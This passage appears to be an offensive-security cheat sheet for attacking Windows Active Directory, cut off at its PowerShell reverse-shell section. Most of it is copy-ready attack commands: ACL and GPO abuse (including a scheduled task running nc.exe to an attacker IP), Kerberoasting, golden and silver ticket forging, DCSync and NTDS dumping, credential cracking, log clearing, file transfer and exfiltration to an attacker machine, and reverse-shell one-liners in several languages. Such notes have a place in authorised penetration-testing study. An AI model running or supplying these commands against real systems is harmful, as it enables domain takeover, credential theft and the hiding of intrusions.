>   $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
>   $DistinguishedName = ([adsi]'').distinguishedName
>   $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
>   $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
>   return $DirectorySearcher.FindAll()
> }
> ```

- Perform user search using LDAP query:
> ```powershell
> LDAPSearch -LDAPQuery "(samAccountType=805306368)"
> ```

- Search for all possible groups in AD:
> ```powershell
> LDAPSearch -LDAPQuery "(objectclass=group)"
> ```

- Iterate through objects in $group variable:
> ```powershell
> foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>   $group.Properties | Select-Object {$_.cn}, {$_.member}
> }
> ```

## Object Permissions

Active Directory permission types:
        GenericAll: Full permissions
        GenericWrite: Edit certain attributes
        WriteOwner: Change ownership
        WriteDACL: Edit ACEs applied
        AllExtendedRights: Change/reset password, etc.
        ForceChangePassword: Force password change
        Self: Add self to groups

- Run Get-ObjectAcl (PowerView) to specify user:
> ```powershell
> Get-ObjectAcl -Identity [username]
> ```

- Convert Object SID to a name:
> ```powershell
> Convert-SidToName [SID]
> ```

- Enumerate ACLs for a group:
> ```powershell
> Get-ObjectAcl -Identity "[GroupName]" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object SecurityIdentifier, ActiveDirectoryRights
> ```

- Convert SIDs with GenericAll permission to names:
> ```powershell
> "[SID1]", "[SID2]" | Convert-SidToName
> ```

- Add yourself to a domain group:
> ```powershell
> net group "[GroupName]" [username] /add /domain
> ```

- Verify group membership:
> ```powershell
> Get-NetGroup "[GroupName]" | Select-Object member
> ```

## GPP Passwords

1. Search for GPP Passwords in SYSVOL: access SYSVOL share and search for Group Policy Preferences (GPP) files; this happens because a common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files

    Map the DC SYSVOL share:

> ```cmd
> net use z:\\[hostname/domain]\SYSVOL
> ```

2. Find the GPP file: usually the one called Groups.xml: the file is usually located in a path similar to this one \hostname.domain\Policies\{00000000-0000-0000-0000-00000000000}\MACHINE\Preferences\Groups\Groups.xml.

> ```cmd
> dir /s Groups.xml
> type Groups.xml
> ```

3. Decrypt the Found Hash / cpassword:
> ```text
> gpp-decrypt [gpp_hash/cpassword]
> ```
# Example
> ```bash
> gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
> sup3r53cr3tGP0pa55
> ```

(Optional) Alternative Method:

1. Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
> ```cmd
> dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword
> ```

2. Look for Groups.xml files which might contain cleartext passwords.
> ```bash
> smbclient //dc-ip/SYSVOL -U "domain\username"
> ```

3. Impacket-Get-GPPPassword

- NULL Session: this command attempts to retrieve GPP passwords without providing any credentials (NULL session). Useful if anonymous access is allowed on the target Domain Controller (DC).
> ```bash
> impacket-Get-GPPPassword -no-pass '[DOMAIN_CONTROLLER]'
> ```

- With Cleartext Credentials: uses cleartext credentials (username and password) to access and retrieve stored GPP passwords from the DC.
> ```bash
> impacket-Get-GPPPassword '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
> ```

- Pass-the-Hash (with NT hash): executes a pass-the-hash attack with the user’s NTLM hash instead of a password, allowing retrieval of GPP passwords.
> ```bash
> impacket-Get-GPPPassword -hashes :'[NThash]' '[DOMAIN]'/'[USER]':'[PASSWORD]'@'[DOMAIN_CONTROLLER]'
> ```

- Parsing a Local File: this command parses a local Policy XML file for stored passwords. Useful if you have a downloaded or extracted policy file on your machine.
> ```bash
> impacket-Get-GPPPassword -xmlfile '/path/to/Policy.xml' 'LOCAL'
> ```

## GPO Abuse

1. Import [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
> ```powershell
>  powershell -ExecutionPolicy bypass
> Import-Module ./PowerView.ps1
> ```

2. List All GPOs: use PowerView to list all GPOs and check if there are write permissions for any.
        Basic GPO Listing
> ```powershell
> Get-NetGPO | select displayname
> ```

2. Manual Permission Check: this checks if you have any write permissions on GPOs, which could allow for privilege escalation.
> ```powershell
> Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
> ```

2. BloodHound Alternative: use BloodHound to check for WriteGPO, OwnsGPO, or GPO control privileges, as they indicate possible GPO manipulation for escalation.

3. Enumerate a Specific GPO
        Identify GPO by Display Name
> ```powershell
> Get-GPO -Name "[DisplayName]"
> ```

4. Convert GPO ID to Name
> ```powershell
> Get-GPO -Guid [gpo_id]
> ```

5. Check Permissions on Specific GPO: verify if you have edit permissions or ownership on a particular GPO.
> ```powershell
> Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
> ```

6. Execute the Attack (If Permissions Allow): se SharpGPOAbuse to manipulate GPOs.
        Create a Reverse Shell Task
> ```cmd
> ./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "[current_user]" --Command "cmd.exe" --Arguments "/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe" --GPOName "[GPO_to_abuse]"
> ```

7. Add User to Administrators Group
> ```cmd
> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "[GPO_to_abuse]"
> ```

8. Force Policy Update: apply the GPO changes immediately across the domain.
> ```cmd
> gpupdate /force
> ```

## AS-REP Roasting

1. Find users without pre-authentication:
> ```powershell
> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
> ```

2. AS-REP Roasting using Rubeus:
> ```cmd
> Rubeus.exe asreproast
> ```
### The /nowrap option prevents the output from being wrapped to the next line, allowing you to see the entire output on a single line without any breaks
> ```cmd
> Rubeus.exe asreproast /nowrap
> ```

3. AS-REP Hash extraction using Impacket:
### From Kali (GetNPUsers.py)
> ```bash
> impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]
> ```
### From Windows
> ```bash
> impacket-GetNPUsers domain/[user]:[password]@[dc-ip] -no-pass
> ```

4. Crack the AS-REP hash:
> ```bash
> hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
> ```

## Kerberoasting

How it works:
    The attacker requests a TGS for a service account (SPN) that has a valid ticket.
    The service's TGS is encrypted with the service account's password hash.
    The attacker can extract the TGS ticket and crack it offline using tools like hashcat.


1. Enumerate Service Principal Names (SPNs):
> ```bash
> impacket-GetUserSPNs domain/[user]:[password]@[dc-ip]
> ```
    
2. Request a TGS ticket for SPNs:
### From Kali
> ```bash
> sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
> ```
or
> ```bash
> sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]
> ```
### From Windows
> ```text
> GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
> ```
    
3. Extract TGS ticket from memory using Rubeus:
> ```cmd
> Rubeus.exe kerberoast
> ```
or
> ```cmd
> Rubeus.exe kerberoast /outfile:[output_file].kerberoast
> ```
    
- Crack the TGS hash:
> ```bash
> hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
> ```

## Silver Ticket

How it works:

    The attacker obtains the NTLM hash or Kerberos hash of a service account.
    The attacker uses this hash to create a forged TGS ticket, allowing them to authenticate to specific services (e.g., CIFS, HTTP).
    Since Silver Tickets bypass domain controllers, they are harder to detect in logs.

Steps:
    Extract NTLM hash of the service account (e.g., CIFS):

1. Find the [ServiceAccountName]
> ```powershell
> Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
> ```
or
> ```powershell
> Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
>

2. Extract the NTLM hash
> ```text
> mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]
> ```
# Example:
> ```text
> mimikatz # lsadump::dcsync /user:HTTP/server01
> ```
    
  Create a Silver Ticket using Mimikatz:
1. Find the Domain SID
> ```powershell
> (Get-ADDomain).DomainSID
> ```
or
> ```powershell
> whoami /user
> ```

2. Find the target server (my DC server)
> ```powershell
> Get-ADDomainController -Filter *
> ```
or
> ```cmd
> netdom query dc
> ```

3. Create the Silver Ticket, for example in this case /service:CIFS (for help deciding the /service, check Section 12.11)
> ```text
> mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]
> ```
### Example:
> ```text
> mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser
> ```

4. Inject the Silver Ticket into the session:
> ```text
> mimikatz # kerberos::ptt silver_ticket.kirbi
> ```

5. Confirm the existence of the ticket
> ```cmd
> klist
> ```

6. Access the target service (e.g., CIFS):
> ```cmd
> dir \\targetserver\sharedfolder
> ```

## Golden Ticket

How it works:

    The attacker dumps the KRBTGT account hash (using tools like Mimikatz).
    Using this hash, they can create a forged TGT for any user.
    The forged TGT can be used to authenticate as any user across the domain, including Domain Admins.

Steps:
1. Dump KRBTGT account hash:
> ```text
> mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
> ```

2. Create Golden Ticket using Mimikatz:
### 1. Find the Domain SID
> ```powershell
> (Get-ADDomain).DomainSID
> ```
or
> ```cmd
> whoami /user
> ```

### 2. Find the RID: The RID for the Administrator account is 500, but other accounts will have different RIDs. You can find the RID of a specific user using tools like Mimikatz or by querying Active Directory.
> ```powershell
> PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\ServiceAccount')).Translate([System.Security.Principal.SecurityIdentifier]).Value"
> ```

### 3. Create the Ticket
> ```text
> mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
> ```
or
> ```text
> mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
> ```

3. Inject Golden Ticket:
> ```text
> mimikatz # kerberos::ptt golden_ticket.kirbi
> ```

4. Confirm the existence of the ticket
> ```cmd
> klist
> ```

5. Access domain resources:
> ```cmd
> net use \\domaincontroller\C$ /user:[DesiredUsername]
> ```

## DCSYNC

How it works:

    Permissions: The attacker needs to have the Replicating Directory Changes or Replicating Directory Changes All permissions, which are often granted to Domain Admins and other high-privilege accounts.
    Replication Request: By sending a replication request, the attacker can pull user account data, including password hashes, directly from a Domain Controller.
    Credential Theft: Once the attacker obtains these hashes, they can use them for further attacks (like Pass-the-Hash or Pass-the-Ticket) or crack them to obtain plaintext passwords.

Steps:
1. Identify Domain Admins: ensure you have the required permissions.
> ```powershell
> Get-ADGroupMember -Identity "Domain Admins"
> ```

2. Perform DC Sync using Mimikatz:
### From Kali
> ```bash
> impacket-secretsdump [domain.com]/[adminUser]:"[password]"@[dc-ip]
> ```
### or; the -just-dc-user [targetUser] is to only extract the hashes of the indicated user and not all the DC.
> ```bash
> impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:"[password]"@[dc-ip]
> ```
### From Windows
> ```text
> mimikatz # lsadump::dcsync /domain:[domain.com]
> ```
### or; here we just extract the specified user.
> ```text
> mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
> ```

3. Extracting all accounts and hashes:
> ```text
> mimikatz # lsadump::dcsync /domain:[domain.com]
> ```

4. Output to a file:
### You can redirect output to a file for analysis:
> ```text
> mimikatz # lsadump::dcsync /domain:domain.com > output.txt
> ```

5. Crack dumped hashes:
> ```bash
> hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
> ```

## Shadow Copies

How It Works:

    Creation of Shadow Copies: Shadow Copies are created automatically or can be manually initiated. They allow for data recovery and backup without disrupting active processes.
    Accessing Shadow Copies: The shadow copies can be accessed through the file system, often found in a hidden directory. This feature can be used to recover deleted files or view past versions of files.

Steps to Attack Shadow Copies:

1. Create a Shadow Copy of the Entire Disk: this action requires local administrator privileges.
### -p X: this indicates which disk we wanto to copy, usually is C.
> ```cmd
> vshadow.exe -nw -p C:
> ```
    
2. Copy the NTDS Database to the Specified Destination Copying the NTDS Database to the C: Drive: to back up the NTDS database from the shadow copy, use the following command.

### Replace X with the shadow copy number, found in the previous command
> ```cmd
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\desired\backup\path\ntds.dit.bak
> ```
### Example
> ```cmd
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
> ```

3. Save the System Registry to the Specified Destination:

> ```cmd
> reg.exe save hklm\system C:\backup_path\system.bak
> ```
### Example
> ```cmd
> C:\> reg.exe save hklm\system c:\system.bak
> ```

4. Download the Files to the Kali.

5. Extract the Data from the NTDS Database using Kali: this command retrieves user credentials and hash values from the NTDS database backup, enabling further security assessments.

> ```cmd
> impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL
> ```
### Example
> ```cmd
> impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
> ```
### (Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
> ```text
> mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
> ```

Steps to Access Shadow Copies:

1. List Shadow Copies: use the following command to view existing shadow copies on a system.

> ```cmd
> vssadmin list shadows
> ```

2. Access a Shadow Copy:
   Find the shadow copy you want to access and note its shadow copy ID.
        Mount the shadow copy using the following command:

### Replace X with the shadow copy number.
> ```cmd
> mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
> ```

3. Explore the Mounted Shadow Copy: navigate to the new folder (C:\ShadowCopy) to explore and extract files.

> ```cmd
> dir C:\ShadowCopy
> ```

4. Recover Sensitive Data: look for sensitive files, such as password files, documents, or configuration files that may contain credentials or sensitive information.

## Pass-the-ticket

How It Works:
    Kerberos Authentication Flow: When a user authenticates, a TGT is issued by the Key Distribution Center (KDC) and stored in memory.
    Ticket Extraction: If an attacker has SYSTEM access to a machine, they can extract the TGT of any user currently logged in using tools like Mimikatz.
    Ticket Injection: The attacker can inject the stolen TGT into their own session to impersonate that user without needing their credentials.
    Lateral Movement: With the TGT in memory, the attacker can access other systems and services as the compromised user, including Domain Controllers.

Steps to Perform a Pass-the-Ticket Attack:
    Gain SYSTEM Access on a Compromised Machine:
    You need SYSTEM privileges to extract tickets from memory using Mimikatz or similar tools.

1. Extract Kerberos Tickets Using Mimikatz:
> ```text
> mimikatz
> privilege::debug
> sekurlsa::tickets
> ```
2. Export the TGT to a File:
### This will save .kirbi files to disk. Identify the correct TGT based on the user and encryption type.
> ```text
> sekurlsa::tickets /export
> ```
3. Inject the TGT into Your Session:
> ```text
> kerberos::ptt C:\path\to\admin_ticket.kirbi
> ```
4. Verify the Injected Ticket:
> ```text
> klist
> ```
5. Perform Lateral Movement with the Injected Identity Perform Lateral Movement with the Injected Identity (in this case is getting RCE to another system but it can be accessing any other privileged resource):
### From Windows
### Using VMI
> ```cmd
> wmic /node:[target_host] process call create "cmd.exe"
> ```
### Using PsExec - SysInternal (May still require plaintext creds unless SMB session picks up Kerberos ticket)
> ```cmd
> PsExec.exe \\[target_host] -u [domain]\[username] cmd.exe
> ```
### Using WinRM (PowerShell Remoting)
> ```powershell
> Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]
> ```
### RDP: use mstsc (Remote Desktop), if TGT is injected correctly and domain trust allows it, you won’t be prompted for a password.
### From Kali
### Transfer the .kirbi to your Kali machine, and then convert the .kirbi ticket
> ```bash
> kirbi2ccache [ticket_file].kirbi > [ticket_file].ccache
> export KRB5CCNAME=./[ticket_file].ccache
> ```
### Using PsExec
> ```bash
> impacket-psexec -k -no-pass [domain]/[username]@[target_host]
> ```
### Using Evil-WinRM
> ```bash
> evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
> ```

---

## Useful Privileges

| Privilege                        | Impact      | Tool            | Execution Path                                                                                                                                                                                                                   | Remarks                                                                                             |
|-----------------------------------|-------------|-----------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| SeAssignPrimaryToken              | Admin       | 3rd party tool  | "It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"                                                                                         |                                                           |
| SeAudit                           | Threat      | 3rd party tool  | Write events to the Security event log to fool auditing or to overwrite old events.                                                                                                                                                  | Writing own events is possible with Authz Report Security Event API.                               |
| SeBackup                          | Admin       | 3rd party tool  | 1. Backup the HKLM\SAM and HKLM\SYSTEM registry hives<br>2. Extract the local accounts hashes from the SAM database<br>3. Pass-the-Hash as a member of the local Administrators group                                               | For more information, refer to the SeBackupPrivilege file.                                          |
| SeBackup                          | Admin       | Built-in commands| 1. Enable the privilege in the token<br>2. Export the HKLM\SAM and HKLM\SYSTEM registry hives<br>3. Transfer the exported hives on a controlled computer<br>4. Extract the local accounts hashes from the export SAM hive.         | Pass-the-Hash authentications can be attempted over various services such as SMB, WinRM, and more.  |
| SeCreateToken                     | Admin       | 3rd party tool  | Create arbitrary token including local admin rights with NtCreateToken.                                                                                                                                                           |                                                                                                     |
| SeDebug                           | Admin       | PowerShell      | Duplicate the lsass.exe token.                                                                                                                                                                                                      | Script to be found at FuzzySecurity.                                                               |
| SeImpersonate                     | Admin       | 3rd party tool  | Tools from the Potato family (potato.exe, RottenPotato, RottenPotatoNG, Juicy Potato, SigmaPotato, SweetPotato, RemotePotato0), RogueWinRM, PrintSpoofer.                                                                             | Allows to create a process under the security context of another user.                             |
| SeIncreaseQuota                   | Availability| 3rd party tool  | Change cpu, memory, and cache limits to some values making the OS unbootable.                                                                                                                                                       | The same privilege is used for managing registry quotas.                                           |
| SeLoadDriver                      | Admin       | 3rd party tool  | 1. Load buggy kernel driver such as szkg64.sys<br>2. Exploit the driver vulnerability                                                                                                                                              | CVE-2018-15732 is associated with szkg64.                                                          |
| SeRestore                         | Admin       | PowerShell      | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with Enable-SeRestorePrivilege.<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe                            | Attack may be detected by some AV software. Alternative method uses replacing service binaries.     |
| SeSecurity                        | Threat      | Built-in commands| Clear Security event log: wevtutil cl Security<br>Shrink the Security log to 20MB: wevtutil sl Security /ms:0<br>Read Security event log to gain knowledge about processes, access, and actions of other users.                    | Purging old events without leaving obvious evidence of cleaning.                                    |
| SeShutdown                        | Availability| Built-in commands| shutdown.exe /s /f /t 1                                                                                                                                                                                                              | Allows to call NtRaiseHardError causing immediate BSOD and memory dump, leading potentially to sensitive information disclosure. |
| SeTakeOwnership                   | Admin       | Built-in commands| 1. takeown.exe /f "%windir%\system32"<br>2. icacls.exe "%windir%\system32" /grant "%username%":F<br>3. Rename cmd.exe to utilman.exe                                                                                             | Attack may be detected by some AV software. Alternative method uses replacing service binaries.     |
| SeTcb                              | Admin       | 3rd party tool  | Manipulate tokens to have local admin rights included.                                                                                                                                                                           | Sample code+exe creating arbitrary tokens to be found at PsBits.                                    |
| SeTrustedCredManAccess            | Threat      | 3rd party tool  | Dumping credentials from Credential Manager                                                                                                                                                                                          |                                                                                                     |

---

## File Transferring

1. SMB
   - On the attacker Kali machine:
> ```bash
> impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_user -password my_password
> ```
    
   - On the victim Windows machine:
> ```cmd
> net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password
> ```

2. HTTP Requests
   - Set HTTP Server in our Kali
> ```bash
> python3 -m http.server 80
> ```
> ```text
> (new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
> ```
   - Download in Windows (different options)
### From PowerShell
> ```powershell
> (New-Object System.Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')
> ```
> ```powershell
> Invoke-WebRequest -Uri http://[kali_IP]/[file_to_download] -OutFile [output_file_name]
> ```
### If iwr does not work 
> ```cmd
> certutil -urlcache -split -f http://[kali_IP]/[file_to_download]
> ```
### From CMD
> ```cmd
> powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')"
> ```

3. PHP Script (bring files from Windows)
    - Create the file upload.php in Kali
> ```php
> <?php
>   $uploaddir = '/var/www/uploads/';
>
>   $uploadfile = $uploaddir . $_FILES['file']['name'];
>
>   move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
> ?>
> ```
   - Move the file to specific folder var/www/uploads

> ```bash
> chmod +x upload.php
>
> sudo mkdir /var/www/uploads
>
> mv upload.php /var/www/uploads
> ```
    
   - Start the Apache server

> ```bash
> service apache2 start
>
> ps -ef | grep apache
> ``` 
   
   - Send the files from the Windows
> ```powershell
> powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
> ```
   - Stop the Apache server
> ```bash
> service apache2 stop
> ```

4. Netcat
    - On the receiver machine: Start listening on a specific port and redirect the incoming file to a local file.
> ```bash
> nc -lvp 4444 > received_file.txt
> ```
### (Optional) If we need to transfer the files over an encrypted connection just attach the --ssl option
> ```bash
> ncat --ssl -lvp 4444 > received_file.txt
> ```

   - On the sender machine: Send the file to the receiver’s IP address on the same port.
> ```bash
> nc <receiver_IP> 4444 < file_to_send.txt
> ```
### (Optional) If we need to receive the files over an encrypted connection just attach the --ssl option
> ```bash
> ncat --ssl <receiver_IP> 4444 < file_to_send.txt
> ```

5. Send a File with Compression
   - Compressing the file before sending can speed up the transfer:
    - On the receiver machine:
> ```bash
> nc -lvp 4444 | tar xzvf -
> ```
    
   - On the sender machine:
> ```bash
> tar czvf - file_or_folder_to_send | nc <receiver_IP> 4444
> ```

6. Using Base64 Contents
Transferring Base64 via Copy and Paste

Sometimes, you may need to transfer a file by copying and pasting its Base64-encoded contents directly in a terminal session. This method can be useful when you can't transfer files directly, but can transfer text.

   - Encode the file and print its Base64-encoded contents in the terminal:
### This will print the Base64 string directly in the terminal, which you can copy manually
> ```bash
> base64 file_to_send.txt
> ```
   - On the receiver machine:
### You can manually paste the Base64-encoded content into a new file
> ```bash
> echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
> ```

7. Transferring Base64 Contents via Netcat
    - On the receiver machine:
> ```bash
> nc -lvp 4444 | base64 -d > received_file.txt
   - On the sender machine:
> ```bash
> base64 file_to_send.txt | nc <receiver_IP> 4444
> ```

8. Certutil
> ```cmd
> certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
> ```

9. Basic wget script
> ```
> function __wget() {
>     : ${DEBUG:=0}
>     local URL=$1
>     local tag="Connection: close"
>     local mark=0
>
>     if [ -z "${URL}" ]; then
>         printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
>                "${FUNCNAME[0]}" "${FUNCNAME[0]}"
>         return 1;
>     fi
>     read proto server path <<<$(echo ${URL//// })
>     DOC=/${path// //}
>     HOST=${server//:*}
>     PORT=${server//*:}
>     [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
>     [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
>     [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
>     [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"
>
>     exec 3<>/dev/tcp/${HOST}/$PORT
>     echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
>     while read line; do
>         [[ $mark -eq 1 ]] && echo $line
>         if [[ "${line}" =~ "${tag}" ]]; then
>             mark=1
>         fi
>     done <&3
>     exec 3>&-
> }
> ```
- Usage:
> ```bash
> __wget http://<LHOST>/<FILE>
> ```

10. Basic curl script
> ```bash
> function __curl() {
>   read proto server path <<<$(echo ${1//// })
>   DOC=/${path// //}
>   HOST=${server//:*}
>   PORT=${server//*:}
>   [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
>
>   exec 3<>/dev/tcp/${HOST}/$PORT
>   echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
>   (while read line; do
>    [[ "$line" == $'\r' ]] && break
>   done && cat) <&3
>   exec 3>&-
> }
> ```
- Usage:
> ```bash
> __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
> ```

11. SCP

### SCP Commands and Syntax

| **Scenario**         | **Syntax**                                          | **Example**                                                        |
|----------------------|-----------------------------------------------------|--------------------------------------------------------------------|
| **Local to Remote**   | `scp localfile.txt user@remotehost:/remote/dir/`     | `scp myfile.txt john@192.168.1.100:/home/john/`                   |
| **Remote to Local**   | `scp user@remotehost:/remote/dir/remotefile.txt local/dir/` | `scp john@192.168.1.100:/home/john/myfile.txt .` (copies to current dir) |
| **Remote to Remote**  | `scp user1@host1:src_file user2@host2:dest_dir`     | `scp user1@host1:/f user2@host2:/f`                                 |
| **Copy Directory**    | `scp -r local_dir user@remotehost:/remote/dir/`     | `scp -r myproject/ john@192.168.1.100:/var/www/`                   |

### Important SCP Options

| **Option**    | **Description**                                                        | **Example**                                                        |
|---------------|------------------------------------------------------------------------|--------------------------------------------------------------------|
| `-P port`     | Specifies a custom SSH port for the remote host (uppercase P).          | `scp -P 2222 file.txt user@host:/path`                             |
| `-r`          | Recursively copies entire directories and their contents.               | `scp -r dir/ user@host:/path`                                      |
| `-i file`     | Uses a specific identity file (private key) for authentication.         | `scp -i ~/.ssh/key file.txt user@host:/path`                       |
| `-p`          | Preserves the original file's modification times, access times, and modes. | `scp -p file.txt user@host:/path`                                  |
| `-C`          | Enables compression of data during the transfer, which can speed up transfers on slow networks. | `scp -C file.txt user@host:/path`                                  |
| `-q`          | Quiet mode; disables the progress meter and non-error messages.        | `scp -q file.txt user@host:/path`                                  |

---

## Reverse Shells

- ### Useful Resources:
- https://www.revshells.com/
- https://pentestmonkey.net

1. Direct Bash reverse shell
> ```bash
> /bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
> ```
### Add the reverse shell to an existing file
> ```bash
> echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
> 

2. One-Liners
- ### FIFO method with Netcat
> ```bash
> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f
> ```

- ### Using 'sh' for reverse shell
> ```bash
> sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
> ```

- ### CMD
CMD does not have a direct command to get a reverse shell, so we first need to download Netcat to the Windows system and then use it to get the reverse shell, sometimes Netcat can be already installed in C:
\Windows\System32\nc.exe.

- ### 1. Download Netcat from a CMD
> ```cmd
> certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
> ```
- ### 2. Execute the reverse shell command
> ```cmd
> .\nc.exe 192.168.45.215 444 -e cmd.exe
> ```
- ### (Optional) use double backslash to handling special character if it is part of an injection command
> ```cmd
> .\\\\nc.exe 192.168.45.215 444 -e cmd.exe
> ```

- ### Golang
> ```go
> echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<TARGET_IP>:<TARGET_PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
> ```

- ### Java
> ```java
> r = Runtime.getRuntime()
> p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<TARGET_IP>/<TARGET_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
> p.waitFor()
> ```

- ### Lua
> ```lua
> lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"
> ```

- ### Netcat
### Using -e
> ```bash
> nc <TARGET_IP> <TARGET_PORT> -e /bin/sh
> nc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash
> ```
### Without -e option
> ```bash
> mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
> ```
### Add the reverse shell to an existing file
> ```bash
> echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
> ```

- ### Perl
> ```perl
> perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
> ```

- ### PowerShell
### Main Option
> ```powershell
